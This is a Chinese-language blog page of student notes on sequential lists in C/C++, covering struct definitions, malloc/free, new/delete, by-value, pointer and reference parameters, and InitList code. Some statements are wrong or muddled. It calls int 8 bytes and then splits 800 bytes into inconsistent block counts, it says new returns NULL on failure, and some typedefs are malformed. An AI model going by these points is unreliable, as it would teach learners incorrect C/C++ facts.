class="code"><pre><code class="hljs c"><span class="hljs-comment">//比如，data[]中是abcde，那就能这样</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> data[];<br>    <span class="hljs-type">int</span> length<br>&#125;SqList;<span class="hljs-comment">//顺序表类型</span><br><br><span class="hljs-comment">//或者：</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElemType<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    ElemType data[];<br>    <span class="hljs-type">int</span> length<br>&#125;SqList;<span class="hljs-comment">//顺序表类型</span><br></code></pre></td></tr></table></figure><p>如果表中元素类型不单一，可以定义一个复杂的结构类型（结构体的嵌套使用）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">float</span> p;<br>    <span class="hljs-type">int</span> e;<br>&#125;Polynomial;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>Polynomial *elem; <span class="hljs-comment">//首地址，elem保存地址，这行代码意思是定义了一个Polynomial型的指针变量</span><br><span class="hljs-type">int</span> length;<br>&#125;SqList;<br><br><br></code></pre></td></tr></table></figure><h3 id="数组定义">2.4.2 数组定义</h3><p>数组静态分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span> <br>    ElemType data[MaxSize]; <br>    <span class="hljs-type">int</span> length;<br>&#125;SqList;<span class="hljs-comment">//顺序表类型</span><br></code></pre></td></tr></table></figure><p>数组动态分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//数组名其实就是首元素的地址，所以也可以直接定义一个指针，也可以表示一个数组，用来存放数组首地址。数组的大小用相应的函数来动态分配内存</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    ElemType *data;<span class="hljs-comment">//数组首地址</span><br>    <span class="hljs-type">int</span> length;<br>&#125;SqList;<span class="hljs-comment">//顺序表类型</span><br></code></pre></td></tr></table></figure><p>这种方式我们不知道内存到底有多大，接下来将用内存分配函数来分配空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SqList L; <span class="hljs-comment">//L就是要操作的顺序表，即SqList</span><br><span class="hljs-comment">//L就有两个成员L.data，用来存放顺序表的元素，另一个是L.length</span><br>L.data = (ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType)*MaxSize);<br></code></pre></td></tr></table></figure><h3 id="c语言的内存动态分配">2.4.3 C语言的内存动态分配</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SqList L; <br>L.data = (ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType)*MaxSize);<br></code></pre></td></tr></table></figure><ul><li><code>malloc(m)</code>函数，开辟m字节长度的地址空间，并返回这段空间的首地址，参数m要求是一个整数</li><li><code>sizeof(x)</code>运算，计算变量x的长度，即变量需占的字节数×变量个数</li><li><code>L.data</code>是数组的首地址（无空间），<code>ElemType*</code>使新分配的空间首地址的元素类型为数组的元素类型，一个“=”就能将放置数组元素类型的空间分配给L了</li><li><code>free(p)</code>函数，释放指针p所指变量的存储空间，即彻底删除一个变量</li><li><code>L.data = (ElemType*)malloc(sizeof(ElemType)*MaxSize);</code><ul><li>后面这个<code>*</code>意思是乘号</li><li>前面的<code>()</code>的意思是强制类型转换，<ul><li><code>(int)</code>强制转换为整数</li><li><code>(int *)</code>强制转换为指向整型的一个指针</li><li><code>(ElemType*)</code>意思是强制转换成指向数据元素类型<code>ElemType</code>的一个指针，</li></ul></li><li>后面的<code>ElemType</code>表示字节数，比如<code>char</code>需要1个字节，<code>int</code>需要8个字节，那如果<code>MaxSize</code>为100，为<code>char</code>时就需要开辟100字节长度的地址空间，<code>int</code>时就需要开辟800字节长度的地址空间</li><li>前面的<code>ElemType</code>是告诉计算机存成什么类型的，比如后面的<code>ElemType</code>为<code>int</code>，<code>MaxSize</code>为100，那一共800个字节要怎么分配呢，如果为<code>char</code>，就被分为800块，如果是<code>int</code>，就被分为200块，划分成什么类型看我们线性表里面的元素是什么类型</li></ul></li><li>需要加载的头文件：<code>&lt;stdlib.h&gt;</code></li></ul><h3 id="c内容">2.4.4 C++内容</h3><h4 id="c的动态存储分配">C++的动态存储分配</h4><p><code>new 类型名T（初值列表)</code></p><p>功能：申请用于存放T类型对象的内存空间，并依初值列表赋以初值</p><p>结果值：</p><ul><li>成功：T类型的指针，指向新分配的内存</li><li>失败：0（NULL)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *p1 = new <span class="hljs-type">int</span>;  <span class="hljs-comment">//从内存当中动态的分配一块空间，放一个int型，赋给一个指针变量</span><br><span class="hljs-type">int</span> *p1 = new <span class="hljs-type">int</span>(<span class="hljs-number">10</span>);  <span class="hljs-comment">//给空间赋上初值</span><br></code></pre></td></tr></table></figure><p><code>delete 指针P</code></p><p>功能：释放指针P所指向的内存。P必须是new操作的返回值</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">delete p1<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="c-的参数传递">C++ 的参数传递</h4><p>传值方式（参数为整型、实型、字符型等）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">float</span> m,<span class="hljs-type">float</span> n)</span></span>&#123;<br>    <span class="hljs-type">float</span> temp;<br>    temp = m;<br>    m = n;<br>    n = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">float</span> a, b;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter two numbers: &quot;</span>;<br>    cin &gt;&gt; a &gt;&gt; b;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Before swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br>    <span class="hljs-built_in">swap</span>(a, b);<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;After swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//Enter two numbers: 5 9</span><br><span class="hljs-comment">//Before swapping: a = 5, b = 9</span><br><span class="hljs-comment">//After swapping: a = 5, b = 9</span><br></code></pre></td></tr></table></figure><ul><li>说明：函数修改的是形参的值，释放空间后，形参释放，实参的值不变</li></ul><p>传地址方式-----指针变量作参数</p><ul><li><p>参数为指针变量</p><ol type="1"><li>形参变化影响实参</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">float</span> *m,<span class="hljs-type">float</span> *n)</span></span>&#123;<br>    <span class="hljs-type">float</span> t;<br>    t = *m;<br>    *m = *n;<br>    *n = t;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">float</span> a,b,*p1,*p2;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter two numbers: &quot;</span>;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Before swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br>    p1 = &amp;a;p2 = &amp;b;  <span class="hljs-comment">//p1、p2分别指向变量a、b</span><br>    <span class="hljs-built_in">swap</span>(p1,p2);<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;After swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br>&#125;<br>  <br>  <span class="hljs-comment">//Enter two numbers: 5 9</span><br>  <span class="hljs-comment">//Before swapping: a = 5, b = 9</span><br>  <span class="hljs-comment">//After swapping: a = 9, b = 5</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>形参变化不影响实参</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">float</span> *m,<span class="hljs-type">float</span> *n)</span></span>&#123;<br>    <span class="hljs-type">float</span> *t;<br>    t = m;<br>    m = n;<br>    n = t;<span class="hljs-comment">//交换的是m和n指向的地址不是地址中的内容</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">float</span> a,b,*p1,*p2;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter two numbers: &quot;</span>;<br>    cin&gt;&gt;a&gt;&gt;b;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Before swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br>    p1 = &amp;a;p2 = &amp;b;  <span class="hljs-comment">//p1、p2分别指向变量a、b</span><br>    <span class="hljs-built_in">swap</span>(p1,p2);<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;After swapping: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//swap(p1,p2)后没交换</span><br></code></pre></td></tr></table></figure></li><li><p>参数为数组名(传递的是数组的首地址，对形参数组所做的任何改变都将反映到实参数组中)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span> <span class="hljs-comment">// 包含字符串处理函数的头文件</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-type">char</span> b[])</span></span>&#123;<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;world&quot;</span>); <span class="hljs-comment">// 使用strcpy函数将字符串拷贝到数组中</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">10</span>] = <span class="hljs-string">&quot;hello&quot;</span>;<br>    <span class="hljs-built_in">sub</span>(a);<br>    cout &lt;&lt; a &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//输出world</span><br><span class="hljs-comment">//在C++中，你不能直接对整个数组进行赋值操作。正确的方式是使用字符串库函数（如 strcpy）将字符串拷贝到数组中。</span><br></code></pre></td></tr></table></figure></li><li><p><strong>参数为引用变量</strong>（引用，即给一个对象提供一个替代的名字）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> &amp;j = i;<br>i = <span class="hljs-number">7</span>;<span class="hljs-comment">//公用同一个空间，但是同时有i、j两个名字，因此改变一个值时，另一个值也会改变</span><br>cout&lt;&lt;<span class="hljs-string">&quot;i = &quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>&lt;&lt;<span class="hljs-string">&quot;j = &quot;</span>&lt;&lt;j;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//引用类型作参数，用的是同一块空间</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">float</span>&amp; m, <span class="hljs-type">float</span>&amp; n)</span></span>&#123;<br>    <span class="hljs-type">float</span> temp;<br>    temp = m;<br>    m = n;<br>    n = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">float</span> a, b;<br>    cin &gt;&gt; a &gt;&gt; b;<br>    <span class="hljs-built_in">swap</span>(a, b);<br>    cout &lt;&lt; a &lt;&lt; endl &lt;&lt; b &lt;&lt; endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 添加 return 0; 语句</span><br>&#125;<br><span class="hljs-comment">//能成功交换a，b</span><br></code></pre></td></tr></table></figure><p>引用类型作形参的说明：</p><ul><li>传递引用给函数与传递指针的效果是一样的，形参变化实参也发生变化</li><li>引用类型作形参，在内存中并没有产生实参的副本，它直接对实参操作；而一般变量作参数，形参与实参就占用不同的存储单元，所以形参变量的值是实参变量的副本。因此，当参数传递的数据量较大时，用引用比用一般变量传递参数的时间和空间效率都好。</li><li>指针参数虽然也能达到与使用引用的效果，但在被调函数中需要重复使用“*指针变量名”的形式进行运算，这很容易产生错误且程序的阅读性较差，另一方面，在主调函数的调用点处，必须用变量的地址作为实参</li><li>所以<strong>后面用引用类型作形参比较多</strong></li></ul></li></ul><h2 id="线性表的顺序表示和实现">2.5 线性表的顺序表示和实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFEASIBLE -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100  <span class="hljs-comment">//线性表存储空间的初始分配量</span></span><br><span class="hljs-comment">//Status 是函数的类型，其值是函数结果状态代码</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Status;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;   <span class="hljs-comment">//ElemType的类型根据实际情况而定，这里假定为int</span><br><span class="hljs-comment">//顺序表数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125;SqList;<br><br></code></pre></td></tr></table></figure><h3 id="线性表l的初始化">2.5.1 线性表L的初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//（参数用引用）</span><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(SqList &amp;L)</span></span>&#123;   <span class="hljs-comment">//构造一个空的顺序表L</span><br>    L.elem = <span class="hljs-keyword">new</span> ElemType[MAXSIZE]; <span class="hljs-comment">//为顺序表分配空间， </span><br>    <span class="hljs-comment">// L.elem = (ElemType *)malloc(MAXSIZE*sizeof(ElemType)); 也可以</span><br>    <br>    <span class="hljs-comment">// 而下面这句是不行的：L -&gt; elem = (ElemType *)malloc(MAXSIZE*sizeof(ElemType));</span><br>    <span class="hljs-comment">//在 C++ 中，使用 -&gt; 运算符来访问指针类型的结构成员，而不是引用。对于结构体 SqList，你应该使用 . 运算符来访问其成员，而不是 -&gt; 运算符。</span><br>    <br>    <span class="hljs-keyword">if</span>(!L.elem) <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    L.length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(SqList* L)</span></span>&#123;<br>    <span class="hljs-comment">//构造一个空的线性表L</span><br>    L -&gt; elem = (ElemType *)<span class="hljs-built_in">malloc</span>(MAXSIZE*<span class="hljs-built_in">sizeof</span>(ElemType));<br>    <span class="hljs-keyword">if</span>(!L -&gt; elem)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    L -&gt; length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//第一种c++实现</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRUE 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FALSE 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW -2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100  <span class="hljs-comment">//线性表存储空间的初始分配量</span></span><br><br><span class="hljs-comment">//Status 是函数的类型，其值是函数结果状态代码</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Status;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;   <span class="hljs-comment">//ElemType的类型根据实际情况而定，这里假定为int</span><br><span class="hljs-comment">//顺序表数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125;SqList;<br><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(SqList &amp;L)</span></span>&#123;   <span class="hljs-comment">//构造一个空的顺序表L</span><br>    L.elem = <span class="hljs-keyword">new</span> ElemType[MAXSIZE]; <span class="hljs-comment">//为顺序表分配空间， </span><br>    <span class="hljs-keyword">if</span>(!L.elem) <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    L.length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">// Function to print the elements of SqList</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OutPut</span><span class="hljs-params">(SqList L)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length: %d, Elements: &quot;</span>, L.length);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; L.length; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, L.elem[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    SqList L;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------构造一个空的线性表L------\n&quot;</span>);<br>    <span class="hljs-built_in">InitList</span>(L);  <span class="hljs-comment">//注意观察这条语句的差别！！！</span><br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311191102529.png"alt="程序运行截图" /><figcaption aria-hidden="true">程序运行截图</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//第二种c++实现</span><br><br><span class="hljs-comment">/* ………… </span><br><span class="hljs-comment">跟前面一样</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function">Status <span class="hljs-title">InitList</span><span class="hljs-params">(SqList* L)</span></span>&#123;<br>    <span class="hljs-comment">//构造一个空的线性表L</span><br>    L -&gt; elem = (ElemType *)<span class="hljs-built_in">malloc</span>(MAXSIZE*<span class="hljs-built_in">sizeof</span>(ElemType));<br>    <span class="hljs-keyword">if</span>(!L -&gt; elem)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    L -&gt; length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OutPut</span><span class="hljs-params">(SqList L)</span> </span>&#123;<br><span class="hljs-comment">//跟前面一样</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    SqList L;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------构造一个空的线性表L------\n&quot;</span>);<br>    <span class="hljs-built_in">InitList</span>(&amp;L);   <span class="hljs-comment">//@@@@@@@@@@</span><br>    <span class="hljs-built_in">OutPut</span>(L);  <span class="hljs-comment">//打印结果</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311191103127.png"alt="程序运行截图" /><figcaption aria-hidden="true">程序运行截图</figcaption></figure><h3 id="销毁清空求长度判断是否为空">2.5.2销毁、清空、求长度，判断是否为空</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 